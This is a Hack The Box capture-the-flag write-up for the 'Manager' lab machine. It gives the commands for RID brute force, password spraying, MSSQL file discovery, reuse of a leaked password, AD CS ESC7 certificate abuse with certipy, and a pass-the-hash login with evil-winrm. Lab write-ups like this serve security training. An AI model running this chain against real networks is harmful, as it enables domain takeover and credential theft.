---
title: HTB Manager
slug: manager
lang: en
platform: Hack The Box
category: Active Directory
headline: MSSQL file discovery, Raven credential exposure and AD CS ESC7
difficulty: Medium
objective: Administrator
date: 2026-05-14
tags: [Active Directory, MSSQL, AD CS, ESC7, WinRM]
---

# HTB Manager

## Executive Summary

Manager exposes MSSQL and allows weak credential reuse after RID-based user enumeration. Access as `operator` leads to file discovery through SQL Server procedures and a web-exposed ZIP archive containing LDAP credentials for `raven`. Raven has dangerous Certificate Authority permissions, enabling an AD CS ESC7 attack: add Raven as an officer, enable SubCA, issue a pending Administrator certificate request and retrieve a certificate usable for Administrator authentication.

## Enumeration and MSSQL Access

The host exposed a Windows domain controller surface plus HTTP and MSSQL.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.66.119 -oG allPorts
sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49693,49721,49790,53631 -sCV -vvv 10.129.66.119 -oN Targeted
```

![[Pasted image 20260513152923.png|Manager attack path summary]]
![[Pasted image 20260513153219.png|Service enumeration]]

RID brute force disclosed several users.

```bash
nxc smb 10.129.66.119 -u 'anonymous' -p '' --rid-brute
```

![[Pasted image 20260513155616.png|RID brute force results]]

Password spraying with usernames as passwords found valid credentials for `operator`.

```bash
nxc smb 10.129.66.119 -u users.txt -p users.txt --no-bruteforce
mssqlclient.py manager/operator:operator@manager.htb -windows-auth
```

![[Pasted image 20260513161243.png|operator credential discovery]]
![[Pasted image 20260513162610.png|MSSQL login as operator]]

## File Discovery and Raven Credentials

`xp_dirtree` exposed interesting web-accessible content. A ZIP archive was downloaded through the HTTP service and extracted.

![[Pasted image 20260513164041.png|xp_dirtree file discovery]]
![[Pasted image 20260513164312.png|Archive extraction]]
![[Pasted image 20260513164616.png|old-conf.xml in archive]]

`.old-conf.xml` contained credentials for `raven@manager.htb`.

```xml
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
```

![[Pasted image 20260513164728.png|Raven credentials in XML]]

WinRM access as Raven succeeded.

![[Pasted image 20260513181317.png|WinRM as Raven]]

## AD CS ESC7

Raven belonged to Certificate Service DCOM Access and had dangerous CA permissions.

```bash
certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -stdout -vulnerable
```

![[Pasted image 20260513182459.png|Raven group and privilege context]]
![[Pasted image 20260513182921.png|Certipy ESC7 finding]]

Raven was added as an officer and the `SubCA` template was enabled.

```bash
certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -ca manager-dc01-ca -add-officer raven -debug
certipy ca -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -ca manager-dc01-ca -enable-template subca
```

![[Pasted image 20260513184539.png|Raven added as officer]]
![[Pasted image 20260513184845.png|SubCA template enabled]]

A certificate request for Administrator was submitted. The request failed due to template permissions, but the private key and request ID were retained.

```bash
certipy req -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
```

![[Pasted image 20260513185209.png|Denied request with request ID]]

The request was approved and retrieved.

```bash
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -ca manager-dc01-ca -issue-request 21
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.66.119 -ca manager-dc01-ca -retrieve 21
```

![[Pasted image 20260513190052.png|Request issued]]
![[Pasted image 20260513190526.png|Certificate retrieved]]

The Administrator certificate was used to recover the NT hash and authenticate via WinRM.

![[Pasted image 20260514071816.png|Administrator hash from certificate]]

```bash
evil-winrm -i 10.129.66.119 -u 'Administrator' -H 'ae5064c2f62317332c88629e025924ef'
```

![[Pasted image 20260514072155.png|Administrator shell]]

## Key Takeaways

- Weak username-as-password patterns remain practical in lab and enterprise environments.
- MSSQL can disclose filesystem paths that become reachable through HTTP.
- ESC7 is powerful when a low-privileged user can manage CA officer or certificate approval workflows.
